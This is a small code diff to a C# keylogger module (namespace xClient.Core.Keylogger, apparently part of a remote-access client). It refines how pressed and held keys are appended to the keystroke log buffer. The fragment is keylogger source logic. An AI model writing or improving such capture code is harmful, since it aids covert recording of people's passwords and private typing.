@@ -135,7 +135,7 @@ namespace xClient.Core.Keylogger
             if (ModifierKeysSet())
                 return;
 
-            if (!_pressedKeyChars.Contains(e.KeyChar))
+            if (!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar))
             {
                 _pressedKeyChars.Add(e.KeyChar);
                 _logFileBuffer.Append(LoggerHelper.Filter(e.KeyChar));
